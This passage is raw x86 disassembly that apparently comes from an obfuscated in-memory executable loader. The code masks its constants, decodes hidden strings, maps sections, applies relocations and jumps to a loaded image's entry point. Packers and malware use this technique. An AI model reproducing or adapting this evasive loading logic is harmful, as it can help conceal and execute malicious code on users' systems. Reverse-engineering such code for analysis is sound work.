  4139fc:	xor    eax,esi
  4139fe:	add    eax,edi
  413a00:	cmp    eax,DWORD PTR [ebp-0xc]
  413a03:	jne    0x413a28
  413a05:	mov    eax,DWORD PTR [ebp-0x8]
  413a08:	mov    ecx,DWORD PTR [ebp-0x20]
  413a0b:	xor    eax,esi
  413a0d:	xor    ecx,esi
  413a0f:	lea    ebx,[ebx+eax*1+0x3272dd]
  413a16:	mov    eax,DWORD PTR [ebp+0x10]
  413a19:	mov    eax,DWORD PTR [eax+0x1d8]
  413a1f:	add    ecx,edi
  413a21:	imul   ecx,ebx
  413a24:	push   ecx
  413a25:	call   DWORD PTR [eax+0x24]
  413a28:	mov    eax,DWORD PTR [ebp-0x4]
  413a2b:	xor    eax,esi
  413a2d:	add    eax,edi
  413a2f:	cmp    eax,DWORD PTR [ebp-0xc]
  413a32:	jne    0x413a43
  413a34:	mov    eax,DWORD PTR [ebp-0x28]
  413a37:	xor    eax,esi
  413a39:	add    eax,edi
  413a3b:	cmp    ebx,eax
  413a3d:	jbe    0x4139bd
  413a43:	mov    eax,DWORD PTR [ebp-0x4]
  413a46:	xor    eax,esi
  413a48:	add    eax,edi
  413a4a:	cmp    eax,DWORD PTR [ebp-0xc]
  413a4d:	jne    0x413a66
  413a4f:	mov    eax,DWORD PTR [ebp-0x8]
  413a52:	mov    ecx,DWORD PTR [ebp-0x18]
  413a55:	xor    eax,esi
  413a57:	lea    eax,[ecx+eax*1+0x3272dd]
  413a5e:	mov    DWORD PTR [ebp-0x18],eax
  413a61:	jmp    0x413b55
  413a66:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  413a6d:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  413a74:	mov    ebx,DWORD PTR [ebp-0x4]
  413a77:	xor    ebx,esi
  413a79:	add    ebx,edi
  413a7b:	jmp    0x413b42
  413a80:	mov    eax,DWORD PTR [ebp-0x4]
  413a83:	xor    eax,esi
  413a85:	add    eax,edi
  413a87:	mov    DWORD PTR [ebp-0x14],eax
  413a8a:	mov    eax,DWORD PTR [ebp-0x4]
  413a8d:	xor    eax,esi
  413a8f:	add    eax,edi
  413a91:	mov    DWORD PTR [ebp+0xc],eax
  413a94:	mov    ecx,DWORD PTR [ebp-0x4]
  413a97:	mov    eax,DWORD PTR [ebp-0x24]
  413a9a:	xor    ecx,esi
  413a9c:	add    ecx,edi
  413a9e:	cmp    ecx,eax
  413aa0:	je     0x413aa8
  413aa2:	mov    eax,DWORD PTR [eax+ebx*4]
  413aa5:	mov    DWORD PTR [ebp-0x14],eax
  413aa8:	mov    eax,DWORD PTR [ebp-0x1c]
  413aab:	mov    eax,DWORD PTR [eax+ebx*4]
  413aae:	mov    DWORD PTR [ebp+0xc],eax
  413ab1:	mov    eax,DWORD PTR [ebp-0x4]
  413ab4:	mov    ecx,DWORD PTR [ebp-0x14]
  413ab7:	xor    eax,esi
  413ab9:	add    eax,edi
  413abb:	cmp    eax,ecx
  413abd:	je     0x413ae8
  413abf:	mov    eax,DWORD PTR [ebp-0x4]
  413ac2:	mov    ecx,DWORD PTR [ebp-0x14]
  413ac5:	xor    eax,esi
  413ac7:	add    eax,edi
  413ac9:	shr    ecx,0x1f
  413acc:	cmp    eax,ecx
  413ace:	je     0x413ae8
  413ad0:	mov    ecx,DWORD PTR [ebp-0x14]
  413ad3:	mov    eax,DWORD PTR [ebp+0x10]
  413ad6:	mov    eax,DWORD PTR [eax+0x1d8]
  413adc:	movzx  ecx,cx
  413adf:	push   ecx
  413ae0:	push   DWORD PTR [ebp-0xc]
  413ae3:	call   DWORD PTR [eax+0x8]
  413ae6:	jmp    0x413b01
  413ae8:	mov    eax,DWORD PTR [ebp+0xc]
  413aeb:	add    eax,DWORD PTR [ebp+0x8]
  413aee:	mov    ecx,DWORD PTR [ebp+0x10]
  413af1:	mov    ecx,DWORD PTR [ecx+0x1d8]
  413af7:	add    eax,0x2
  413afa:	push   eax
  413afb:	push   DWORD PTR [ebp-0xc]
  413afe:	call   DWORD PTR [ecx+0x8]
  413b01:	mov    DWORD PTR [ebp+0xc],eax
  413b04:	mov    eax,DWORD PTR [ebp-0x4]
  413b07:	mov    ecx,DWORD PTR [ebp+0xc]
  413b0a:	xor    eax,esi
  413b0c:	add    eax,edi
  413b0e:	cmp    eax,ecx
  413b10:	mov    eax,DWORD PTR [ebp-0x8]
  413b13:	jne    0x413b26
  413b15:	mov    ecx,DWORD PTR [ebp-0x18]
  413b18:	xor    eax,esi
  413b1a:	lea    eax,[ecx+eax*1+0x3272dd]
  413b21:	mov    DWORD PTR [ebp-0x18],eax
  413b24:	jmp    0x413b36
  413b26:	mov    ecx,DWORD PTR [ebp+0xc]
  413b29:	xor    eax,esi
  413b2b:	add    eax,edi
  413b2d:	imul   eax,ecx
  413b30:	mov    ecx,DWORD PTR [ebp-0x1c]
  413b33:	mov    DWORD PTR [ecx+ebx*4],eax
  413b36:	mov    eax,DWORD PTR [ebp-0x8]
  413b39:	xor    eax,esi
  413b3b:	lea    ebx,[ebx+eax*1+0x3272dd]
  413b42:	mov    eax,DWORD PTR [ebp-0x4]
  413b45:	mov    ecx,DWORD PTR [ebp-0x1c]
  413b48:	xor    eax,esi
  413b4a:	add    eax,edi
  413b4c:	cmp    DWORD PTR [ecx+ebx*4],eax
  413b4f:	jne    0x413a80
  413b55:	mov    edx,DWORD PTR [ebp-0x10]
  413b58:	mov    eax,DWORD PTR [ebp-0x18]
  413b5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  413b5e:	sub    edx,0x3272dc
  413b64:	xor    edx,esi
  413b66:	jmp    0x413930
  413b6b:	mov    ecx,DWORD PTR [ebp-0x4]
  413b6e:	xor    ecx,esi
  413b70:	add    ecx,edi
  413b72:	cmp    eax,ecx
  413b74:	mov    eax,DWORD PTR [ebp-0x4]
  413b77:	jne    0x413b81
  413b79:	mov    eax,DWORD PTR [ebp-0x8]
  413b7c:	jmp    0x413b81
  413b7e:	mov    eax,DWORD PTR [ebp-0x4]
  413b81:	xor    eax,esi
  413b83:	add    eax,edi
  413b85:	pop    edi
  413b86:	pop    esi
  413b87:	pop    ebx
  413b88:	leave  
  413b89:	ret    0xc
  413b8c:	push   ebp
  413b8d:	mov    ebp,esp
  413b8f:	sub    esp,0x28
  413b92:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  413b99:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  413ba0:	mov    eax,DWORD PTR [ebp+0xc]
  413ba3:	mov    DWORD PTR [ebp+0xc],eax
  413ba6:	push   esi
  413ba7:	mov    eax,eax
  413ba9:	mov    eax,DWORD PTR [ebp-0x4]
  413bac:	mov    esi,DWORD PTR [ebp+0x8]
  413baf:	mov    ecx,0x7510896
  413bb4:	xor    eax,ecx
  413bb6:	mov    edx,0x3272dd
  413bbb:	add    eax,edx
  413bbd:	cmp    esi,eax
  413bbf:	je     0x413ce6
  413bc5:	mov    eax,DWORD PTR [ebp+0x8]
  413bc8:	mov    esi,DWORD PTR [ebp+0x8]
  413bcb:	add    esi,DWORD PTR [eax+0x3c]
  413bce:	push   edi
  413bcf:	mov    DWORD PTR [ebp+0xc],esi
  413bd2:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  413bd9:	mov    eax,DWORD PTR [ebp-0x1c]
  413bdc:	mov    esi,DWORD PTR [ebp-0x4]
  413bdf:	mov    edi,DWORD PTR [ebp+0xc]
  413be2:	xor    esi,ecx
  413be4:	xor    eax,ecx
  413be6:	add    esi,edx
  413be8:	cmp    DWORD PTR [edi+eax*8+0x1939760],esi
  413bef:	je     0x413ce0
  413bf5:	mov    esi,DWORD PTR [ebp+0xc]
  413bf8:	mov    eax,DWORD PTR [ebp+0x8]
  413bfb:	add    eax,DWORD PTR [esi+0xa0]
  413c01:	mov    esi,DWORD PTR [ebp+0x8]
  413c04:	mov    edi,DWORD PTR [ebp+0xc]
  413c07:	sub    esi,DWORD PTR [edi+0x34]
  413c0a:	mov    edi,DWORD PTR [ebp-0x4]
  413c0d:	xor    edi,ecx
  413c0f:	add    edi,edx
  413c11:	mov    DWORD PTR [ebp-0x24],esi
  413c14:	cmp    esi,edi
  413c16:	je     0x413ce0
  413c1c:	mov    esi,DWORD PTR [ebp-0x4]
  413c1f:	xor    esi,ecx
  413c21:	add    esi,edx
  413c23:	mov    DWORD PTR [ebp-0x8],esi
  413c26:	push   ebx
  413c27:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  413c2e:	jmp    0x413cca
  413c33:	mov    esi,DWORD PTR [ebp-0x4]
  413c36:	xor    esi,ecx
  413c38:	lea    edi,[ebx-0x8]
  413c3b:	add    esi,edx
  413c3d:	shr    edi,1
  413c3f:	cmp    esi,edi
  413c41:	jae    0x413cb0
  413c43:	sub    edi,esi
  413c45:	lea    ebx,[eax+esi*2+0x8]
  413c49:	mov    DWORD PTR [ebp-0x18],edi
  413c4c:	movzx  esi,WORD PTR [ebx]
  413c4f:	and    esi,0xfff
  413c55:	mov    DWORD PTR [ebp-0x14],esi
  413c58:	mov    edi,DWORD PTR [ebp-0x14]
  413c5b:	mov    esi,DWORD PTR [eax]
  413c5d:	sub    esi,edx
  413c5f:	add    edi,esi
  413c61:	movzx  esi,WORD PTR [ebx]
  413c64:	shr    esi,0xc
  413c67:	xor    edi,ecx
  413c69:	mov    DWORD PTR [ebp-0x20],edi
  413c6c:	mov    DWORD PTR [ebp-0x14],esi
  413c6f:	mov    esi,DWORD PTR [ebp-0x20]
  413c72:	mov    edi,DWORD PTR [ebp+0x8]
  413c75:	xor    esi,ecx
  413c77:	lea    esi,[esi+edi*1+0x3272dd]
  413c7e:	mov    DWORD PTR [ebp-0x20],esi
  413c81:	mov    esi,DWORD PTR [ebp-0x10]
  413c84:	mov    edi,DWORD PTR [ebp-0x14]
  413c87:	xor    esi,ecx
  413c89:	add    esi,edx
  413c8b:	cmp    edi,esi
  413c8d:	jne    0x413ca5
  413c8f:	mov    esi,DWORD PTR [ebp-0x10]
  413c92:	mov    edi,DWORD PTR [ebp-0x14]
  413c95:	xor    esi,ecx
  413c97:	add    esi,edx
  413c99:	cmp    edi,esi
  413c9b:	jne    0x413ca5
  413c9d:	mov    esi,DWORD PTR [ebp-0x20]
  413ca0:	mov    edi,DWORD PTR [ebp-0x24]
  413ca3:	add    DWORD PTR [esi],edi
  413ca5:	add    ebx,0x2
  413ca8:	dec    DWORD PTR [ebp-0x18]
  413cab:	jne    0x413c4c
  413cad:	mov    ebx,DWORD PTR [ebp-0xc]
  413cb0:	add    DWORD PTR [ebp-0x8],ebx
  413cb3:	mov    esi,DWORD PTR [ebp-0x1c]
  413cb6:	mov    edi,DWORD PTR [ebp-0x8]
  413cb9:	mov    ebx,DWORD PTR [ebp+0xc]
  413cbc:	xor    esi,ecx
  413cbe:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939764]
  413cc5:	jae    0x413cdf
  413cc7:	add    eax,DWORD PTR [ebp-0xc]
  413cca:	mov    esi,DWORD PTR [ebp-0x4]
  413ccd:	mov    ebx,DWORD PTR [eax+0x4]
  413cd0:	xor    esi,ecx
  413cd2:	add    esi,edx
  413cd4:	mov    DWORD PTR [ebp-0xc],ebx
  413cd7:	cmp    ebx,esi
  413cd9:	jne    0x413c33
  413cdf:	pop    ebx
  413ce0:	mov    eax,DWORD PTR [ebp-0x28]
  413ce3:	pop    edi
  413ce4:	jmp    0x413ce9
  413ce6:	mov    eax,DWORD PTR [ebp-0x4]
  413ce9:	xor    eax,ecx
  413ceb:	add    eax,edx
  413ced:	pop    esi
  413cee:	leave  
  413cef:	ret    0x8
  413cf2:	push   ebp
  413cf3:	mov    ebp,esp
  413cf5:	sub    esp,0x54
  413cf8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  413cff:	mov    DWORD PTR [ebp-0x24],0xf89c85b2
  413d06:	mov    eax,DWORD PTR [ebp-0x4]
  413d09:	push   ebx
  413d0a:	push   esi
  413d0b:	mov    esi,0x7510896
  413d10:	xor    eax,esi
  413d12:	mov    ebx,0x3272dd
  413d17:	add    eax,ebx
  413d19:	mov    DWORD PTR [ebp-0x18],eax
  413d1c:	mov    eax,DWORD PTR [ebp-0x4]
  413d1f:	xor    eax,esi
  413d21:	add    eax,ebx
  413d23:	mov    DWORD PTR [ebp-0x20],eax
  413d26:	push   edi
  413d27:	mov    edi,DWORD PTR [ebp+0x20]
  413d2a:	mov    eax,DWORD PTR [ebp-0x10]
  413d2d:	mov    ecx,DWORD PTR [ebp-0x10]
  413d30:	xor    eax,ecx
  413d32:	mov    DWORD PTR [ebp-0x10],eax
  413d35:	add    DWORD PTR [ebp-0x10],0xf89cb5b5
  413d3c:	mov    eax,DWORD PTR [ebp-0x8]
  413d3f:	mov    ecx,DWORD PTR [ebp-0x8]
  413d42:	xor    eax,ecx
  413d44:	mov    DWORD PTR [ebp-0x8],eax
  413d47:	add    DWORD PTR [ebp-0x8],0xf89c85f5
  413d4e:	mov    eax,DWORD PTR [ebp-0xc]
  413d51:	mov    ecx,DWORD PTR [ebp-0xc]
  413d54:	xor    eax,ecx
  413d56:	mov    DWORD PTR [ebp-0xc],eax
  413d59:	add    DWORD PTR [ebp-0xc],0xf89c85b1
  413d60:	mov    eax,DWORD PTR [ebp-0x14]
  413d63:	mov    ecx,DWORD PTR [ebp-0x14]
  413d66:	xor    eax,ecx
  413d68:	mov    DWORD PTR [ebp-0x14],eax
  413d6b:	add    DWORD PTR [ebp-0x14],0xf89f05b5
  413d72:	mov    eax,0x9588
  413d77:	mov    WORD PTR [ebp+0x20],ax
  413d7b:	mov    eax,DWORD PTR [ebp+0x8]
  413d7e:	test   eax,eax
  413d80:	je     0x414165
  413d86:	mov    eax,DWORD PTR [ebp+0xc]
  413d89:	test   eax,eax
  413d8b:	je     0x414165
  413d91:	mov    eax,DWORD PTR [ebp+0x18]
  413d94:	test   eax,eax
  413d96:	je     0x414165
  413d9c:	mov    ax,WORD PTR [ebp+0x20]
  413da0:	mov    ecx,0x8a89
  413da5:	xor    ax,cx
  413da8:	mov    ecx,0x3b4c
  413dad:	add    ax,cx
  413db0:	mov    ecx,DWORD PTR [ebp+0x8]
  413db3:	cmp    WORD PTR [ecx],ax
  413db6:	jne    0x414165
  413dbc:	mov    eax,DWORD PTR [ebp-0x4]
  413dbf:	mov    ecx,DWORD PTR [ebp+0x8]
  413dc2:	mov    eax,DWORD PTR [ebp+0x8]
  413dc5:	add    eax,DWORD PTR [ecx+0x3c]
  413dc8:	mov    DWORD PTR [ebp+0xc],eax
  413dcb:	mov    eax,DWORD PTR [eax+0x50]
  413dce:	test   eax,eax
  413dd0:	je     0x414165
  413dd6:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  413ddd:	mov    eax,DWORD PTR [ebp-0x2c]
  413de0:	xor    eax,esi
  413de2:	add    eax,ebx
  413de4:	mov    DWORD PTR [ebp-0x2c],eax
  413de7:	mov    eax,DWORD PTR [ebp-0x4]
  413dea:	mov    eax,DWORD PTR [edi+0x190]
  413df0:	mov    ecx,DWORD PTR [eax]
  413df2:	mov    ecx,DWORD PTR [ecx+0x3c]
  413df5:	add    ecx,DWORD PTR [eax]
  413df7:	mov    eax,DWORD PTR [ebp-0x4]
  413dfa:	mov    eax,DWORD PTR [edi+0x18c]
  413e00:	mov    edx,DWORD PTR [eax]
  413e02:	mov    DWORD PTR [ebp-0x1c],ecx
  413e05:	mov    DWORD PTR [ebp+0x20],edx
  413e08:	cmp    edx,edx
  413e0a:	jne    0x413e3f
  413e0c:	mov    eax,DWORD PTR [edi+0x1d8]
  413e12:	lea    edx,[ebp-0x18]
  413e15:	push   edx
  413e16:	mov    edx,DWORD PTR [ebp-0x8]
  413e19:	xor    edx,esi
  413e1b:	add    edx,ebx
  413e1d:	push   edx
  413e1e:	push   DWORD PTR [ecx+0x50]
  413e21:	push   DWORD PTR [ebp+0x20]
  413e24:	call   DWORD PTR [eax+0x1c]
  413e27:	mov    ecx,DWORD PTR [ebp-0x1c]
  413e2a:	mov    eax,DWORD PTR [ecx+0x54]
  413e2d:	mov    ecx,DWORD PTR [ecx+0x50]
  413e30:	sub    ecx,eax
  413e32:	add    eax,DWORD PTR [ebp+0x20]
  413e35:	push   ecx
  413e36:	push   eax
  413e37:	call   0x414779
  413e3c:	mov    edx,DWORD PTR [ebp+0x20]
  413e3f:	mov    eax,DWORD PTR [edi+0x194]
  413e45:	mov    DWORD PTR [eax],edx
  413e47:	mov    eax,DWORD PTR [ebp+0xc]
  413e4a:	push   DWORD PTR [eax+0x54]
  413e4d:	push   DWORD PTR [ebp+0x8]
  413e50:	push   edx
  413e51:	call   0x414620
  413e56:	mov    ecx,DWORD PTR [ebp+0x20]
  413e59:	mov    eax,DWORD PTR [ecx+0x3c]
  413e5c:	add    eax,ecx
  413e5e:	movzx  ecx,WORD PTR [eax+0x14]
  413e62:	lea    ecx,[ecx+eax*1+0x18]
  413e66:	mov    DWORD PTR [ebp+0x18],ecx
  413e69:	mov    ecx,DWORD PTR [ebp-0x4]
  413e6c:	movzx  edx,WORD PTR [eax+0x6]
  413e70:	xor    ecx,esi
  413e72:	add    ecx,ebx
  413e74:	mov    DWORD PTR [ebp+0xc],eax
  413e77:	cmp    edx,ecx
  413e79:	je     0x413f27
  413e7f:	mov    ecx,DWORD PTR [ebp-0x4]
  413e82:	xor    ecx,esi
  413e84:	add    ecx,ebx
  413e86:	mov    DWORD PTR [ebp-0x20],ecx
  413e89:	mov    ecx,DWORD PTR [ebp-0x24]
  413e8c:	movzx  edx,WORD PTR [eax+0x6]
  413e90:	xor    ecx,esi
  413e92:	sub    edx,ecx
  413e94:	sub    edx,ebx
  413e96:	cmp    DWORD PTR [ebp-0x20],edx
  413e99:	ja     0x413f27
  413e9f:	mov    edx,DWORD PTR [ebp+0x18]
  413ea2:	add    edx,0x8
  413ea5:	mov    DWORD PTR [ebp+0x18],edx
  413ea8:	jmp    0x413ead
  413eaa:	mov    edx,DWORD PTR [ebp+0x18]
  413ead:	mov    eax,DWORD PTR [eax+0x38]
  413eb0:	lea    ecx,[eax-0x1]
  413eb3:	mov    DWORD PTR [ebp-0x30],eax
  413eb6:	mov    eax,DWORD PTR [edx]
  413eb8:	test   ecx,eax
  413eba:	je     0x413ec3
  413ebc:	not    ecx
  413ebe:	and    eax,ecx
  413ec0:	add    eax,DWORD PTR [ebp-0x30]
  413ec3:	push   eax
  413ec4:	mov    eax,DWORD PTR [edx+0x4]
  413ec7:	add    eax,DWORD PTR [ebp+0x20]
  413eca:	push   eax
  413ecb:	call   0x414779
  413ed0:	mov    edx,DWORD PTR [ebp-0x4]
  413ed3:	mov    eax,DWORD PTR [ebp+0x18]
  413ed6:	mov    ecx,DWORD PTR [eax+0x8]
  413ed9:	xor    edx,esi
  413edb:	add    edx,ebx
  413edd:	cmp    ecx,edx
  413edf:	je     0x413ef8
  413ee1:	push   ecx
  413ee2:	mov    ecx,DWORD PTR [ebp+0x8]
  413ee5:	add    ecx,DWORD PTR [eax+0xc]
  413ee8:	mov    eax,DWORD PTR [eax+0x4]
  413eeb:	add    eax,DWORD PTR [ebp+0x20]
  413eee:	push   ecx
  413eef:	push   eax
  413ef0:	call   0x414620
  413ef5:	mov    eax,DWORD PTR [ebp+0x18]
  413ef8:	mov    ecx,DWORD PTR [ebp-0x24]
  413efb:	mov    edx,DWORD PTR [ebp-0x20]
  413efe:	add    eax,0x28
  413f01:	xor    ecx,esi
  413f03:	lea    ecx,[edx+ecx*1+0x3272dd]
  413f0a:	mov    edx,DWORD PTR [ebp+0xc]
  413f0d:	mov    DWORD PTR [ebp+0x18],eax
  413f10:	mov    eax,DWORD PTR [ebp-0x24]
  413f13:	movzx  edx,WORD PTR [edx+0x6]
  413f17:	xor    eax,esi
  413f19:	sub    edx,eax
  413f1b:	mov    eax,DWORD PTR [ebp+0xc]
  413f1e:	sub    edx,ebx
  413f20:	mov    DWORD PTR [ebp-0x20],ecx
  413f23:	cmp    ecx,edx
  413f25:	jbe    0x413eaa
  413f27:	mov    ecx,DWORD PTR [ebp-0x4]
  413f2a:	mov    edx,DWORD PTR [edi+0x18c]
  413f30:	xor    ecx,esi
  413f32:	add    ecx,ebx
  413f34:	mov    DWORD PTR [ebp+0x18],ecx
  413f37:	mov    ecx,DWORD PTR [ebp+0x20]
  413f3a:	cmp    ecx,DWORD PTR [edx]
  413f3c:	jne    0x413f65
  413f3e:	mov    eax,DWORD PTR [edi+0x1d8]
  413f44:	lea    edx,[ebp-0x18]
  413f47:	push   edx
  413f48:	mov    edx,DWORD PTR [ebp-0xc]
  413f4b:	xor    edx,esi
  413f4d:	add    edx,ebx
  413f4f:	push   edx
  413f50:	mov    edx,DWORD PTR [ebp-0x1c]
  413f53:	push   DWORD PTR [edx+0x54]
  413f56:	push   ecx
  413f57:	call   DWORD PTR [eax+0x1c]
  413f5a:	test   eax,eax
  413f5c:	je     0x414156
  413f62:	mov    eax,DWORD PTR [ebp+0xc]
  413f65:	mov    ecx,DWORD PTR [edi+0x1c8]
  413f6b:	mov    ecx,DWORD PTR [ecx]
  413f6d:	xor    ecx,esi
  413f6f:	add    ecx,ebx
  413f71:	je     0x414081
  413f77:	and    DWORD PTR [ebp-0x28],0x0
  413f7b:	mov    eax,0x4fab
  413f80:	mov    WORD PTR [ebp-0x3c],ax
  413f84:	add    eax,0xfffffff6
  413f87:	mov    WORD PTR [ebp-0x3a],ax
  413f8b:	mov    eax,0x4f91
  413f90:	mov    WORD PTR [ebp-0x38],ax
  413f94:	add    eax,0x18
  413f97:	and    DWORD PTR [ebp+0x8],0x0
  413f9b:	mov    ecx,eax
  413f9d:	mov    WORD PTR [ebp-0x34],ax
  413fa1:	mov    eax,0x4e3d
  413fa6:	mov    WORD PTR [ebp-0x36],cx
  413faa:	mov    WORD PTR [ebp-0x32],ax
  413fae:	mov    eax,DWORD PTR [ebp+0x8]
  413fb1:	lea    eax,[ebp+eax*2-0x3c]
  413fb5:	mov    ecx,0x8a89
  413fba:	xor    cx,WORD PTR [eax]
  413fbd:	mov    edx,0x3b4c
  413fc2:	add    cx,dx
  413fc5:	inc    DWORD PTR [ebp+0x8]
  413fc8:	cmp    DWORD PTR [ebp+0x8],0x6
  413fcc:	mov    WORD PTR [eax],cx
  413fcf:	jb     0x413fae
  413fd1:	mov    DWORD PTR [ebp-0x54],0x200c1e26
  413fd8:	mov    DWORD PTR [ebp-0x50],0x211e0805
  413fdf:	mov    DWORD PTR [ebp-0x4c],0xf50c0e08
  413fe6:	mov    DWORD PTR [ebp-0x48],0x3d0c0b20
  413fed:	mov    DWORD PTR [ebp-0x44],0x10c1e1e
  413ff4:	mov    WORD PTR [ebp-0x40],0xf0f
  413ffa:	mov    BYTE PTR [ebp-0x3e],0x7a
  413ffe:	xor    ecx,ecx
  414000:	lea    eax,[ebp+ecx*1-0x54]
  414004:	mov    dl,BYTE PTR [eax]
  414006:	xor    dl,0x71
  414009:	sub    dl,0xb
  41400c:	inc    ecx
  41400d:	mov    BYTE PTR [eax],dl
  41400f:	cmp    ecx,0x17
  414012:	jb     0x414000
  414014:	mov    eax,DWORD PTR [edi+0x1d8]
  41401a:	lea    ecx,[ebp-0x3c]
  41401d:	push   ecx
  41401e:	call   DWORD PTR [eax+0x4]
  414021:	mov    ecx,DWORD PTR [edi+0x1d8]
  414027:	lea    edx,[ebp-0x54]
  41402a:	push   edx
  41402b:	push   eax
  41402c:	call   DWORD PTR [ecx+0x8]
  41402f:	lea    ecx,[ebp-0x28]
  414032:	push   ecx
  414033:	mov    ecx,DWORD PTR [edi+0x18c]
  414039:	push   DWORD PTR [ecx]
  41403b:	call   eax
  41403d:	mov    eax,DWORD PTR [ebp-0x28]
  414040:	test   eax,eax
  414042:	je     0x41407e
  414044:	mov    DWORD PTR [ebp+0x8],eax
  414047:	jmp    0x414053
  414049:	mov    eax,DWORD PTR [eax]
  41404b:	mov    DWORD PTR [ebp-0x28],eax
  41404e:	cmp    eax,DWORD PTR [ebp+0x8]
  414051:	je     0x414060
  414053:	mov    edx,DWORD PTR [eax+0x18]
  414056:	mov    ecx,DWORD PTR [edi+0x18c]
  41405c:	cmp    edx,DWORD PTR [ecx]
  41405e:	jne    0x414049
  414060:	mov    edx,DWORD PTR [eax+0x18]
  414063:	mov    ecx,DWORD PTR [edi+0x18c]
  414069:	cmp    edx,DWORD PTR [ecx]
  41406b:	jne    0x41407e
  41406d:	mov    edx,DWORD PTR [ebp-0x1c]
  414070:	mov    ecx,DWORD PTR [edi+0x190]
  414076:	mov    edx,DWORD PTR [edx+0x28]
  414079:	add    edx,DWORD PTR [ecx]
  41407b:	mov    DWORD PTR [eax+0x1c],edx
  41407e:	mov    eax,DWORD PTR [ebp+0xc]
  414081:	push   edi
  414082:	push   eax
  414083:	push   DWORD PTR [ebp+0x20]
  414086:	call   0x4138a9
  41408b:	test   eax,eax
  41408d:	je     0x414156
  414093:	push   DWORD PTR [ebp+0xc]
  414096:	mov    ecx,edi
  414098:	push   DWORD PTR [ebp+0x20]
  41409b:	call   0x413802
  4140a0:	test   eax,eax
  4140a2:	je     0x414156
  4140a8:	mov    eax,DWORD PTR [ebp+0xc]
  4140ab:	mov    edx,DWORD PTR [ebp+0x20]
  4140ae:	mov    ecx,edi
  4140b0:	call   0x4136db
  4140b5:	test   eax,eax
  4140b7:	je     0x414156
  4140bd:	push   edi
  4140be:	push   DWORD PTR [ebp+0x20]
  4140c1:	call   0x413b8c
  4140c6:	test   eax,eax
  4140c8:	je     0x414156
  4140ce:	mov    eax,DWORD PTR [edi+0x18c]
  4140d4:	mov    edx,DWORD PTR [ebp+0x20]
  4140d7:	cmp    edx,DWORD PTR [eax]
  4140d9:	jne    0x4140f5
  4140db:	mov    eax,DWORD PTR [edi+0x1d8]
  4140e1:	lea    ecx,[ebp-0x18]
  4140e4:	push   ecx
  4140e5:	push   DWORD PTR [ebp-0x18]
  4140e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4140eb:	push   DWORD PTR [ecx+0x54]
  4140ee:	push   edx
  4140ef:	call   DWORD PTR [eax+0x1c]
  4140f2:	mov    edx,DWORD PTR [ebp+0x20]
  4140f5:	mov    eax,DWORD PTR [edi+0x1c8]
  4140fb:	mov    eax,DWORD PTR [eax]
  4140fd:	xor    eax,esi
  4140ff:	add    eax,ebx
  414101:	je     0x41413a
  414103:	mov    ecx,DWORD PTR [ebp+0xc]
  414106:	mov    eax,DWORD PTR [ecx+0x28]
  414109:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  414110:	mov    esi,DWORD PTR [ebp+0x8]
  414113:	push   DWORD PTR [ebp+0x14]
  414116:	xor    esi,0x896
  41411c:	push   DWORD PTR [ebp+0x10]
  41411f:	add    esi,0x72dd
  414125:	or     WORD PTR [ecx+0x16],si
  414129:	add    eax,edx
  41412b:	push   edx
  41412c:	call   eax
  41412e:	mov    DWORD PTR [edi+0x1d0],0xf89c85b2
  414138:	jmp    0x414144
  41413a:	mov    eax,DWORD PTR [ebp+0xc]
  41413d:	mov    eax,DWORD PTR [eax+0x28]
  414140:	add    eax,edx
  414142:	call   eax
  414144:	mov    DWORD PTR [ebp-0x20],eax
  414147:	mov    eax,DWORD PTR [ebp-0x20]
  41414a:	mov    ecx,DWORD PTR [ebp+0x1c]
  41414d:	mov    DWORD PTR [ecx],eax
  41414f:	mov    DWORD PTR [ebp+0x18],0x1
  414156:	cmp    DWORD PTR [ebp+0x18],0x0
  41415a:	jne    0x414160
  41415c:	and    DWORD PTR [ebp+0x20],0x0
  414160:	mov    eax,DWORD PTR [ebp+0x20]
  414163:	jmp    0x414167
  414165:	xor    eax,eax
  414167:	pop    edi
  414168:	pop    esi
  414169:	pop    ebx
  41416a:	leave  
  41416b:	ret    0x1c
  41416e:	push   ebp
  41416f:	mov    ebp,esp
  414171:	movzx  edx,WORD PTR [ecx+0x6]
  414175:	movzx  eax,WORD PTR [ecx+0x14]
  414179:	push   ebx
  41417a:	push   edi
  41417b:	xor    edi,edi
  41417d:	lea    eax,[eax+ecx*1+0x18]
  414181:	test   edx,edx
  414183:	je     0x4141a4
  414185:	mov    ecx,DWORD PTR [eax+0xc]
  414188:	lea    ebx,[ecx+esi*1]
  41418b:	cmp    DWORD PTR [ebp+0x8],ebx
  41418e:	jb     0x41419c
  414190:	mov    ebx,DWORD PTR [eax+0x8]
  414193:	add    ebx,ecx
  414195:	add    ebx,esi
  414197:	cmp    DWORD PTR [ebp+0x8],ebx
  41419a:	jb     0x4141a6
  41419c:	add    eax,0x28
  41419f:	inc    edi
  4141a0:	cmp    edi,edx
  4141a2:	jb     0x414185
  4141a4:	xor    eax,eax
  4141a6:	pop    edi
  4141a7:	pop    ebx
  4141a8:	pop    ebp
  4141a9:	ret    0x4
  4141ac:	push   ebp
  4141ad:	mov    ebp,esp
  4141af:	sub    esp,0x28
  4141b2:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  4141b9:	mov    DWORD PTR [ebp-0x1c],0xf89c85b2
  4141c0:	mov    DWORD PTR [ebp-0x28],0xf89c85b3
  4141c7:	mov    eax,0x4f9c
  4141cc:	mov    WORD PTR [ebp-0xc],ax
  4141d0:	mov    eax,0x4e7c
  4141d5:	mov    WORD PTR [ebp-0x4],ax
  4141d9:	mov    eax,0x4fa7
  4141de:	mov    WORD PTR [ebp-0x8],ax
  4141e2:	add    eax,0xffffffe0
  4141e5:	mov    WORD PTR [ebp-0x8],ax
  4141e9:	mov    eax,DWORD PTR [ebp+0x8]
  4141ec:	mov    DWORD PTR [ebp-0x14],eax
  4141ef:	mov    eax,DWORD PTR [ebp+0xc]
  4141f2:	mov    DWORD PTR [ebp-0x18],eax
  4141f5:	mov    eax,DWORD PTR [ebp-0x10]
  4141f8:	push   ebx
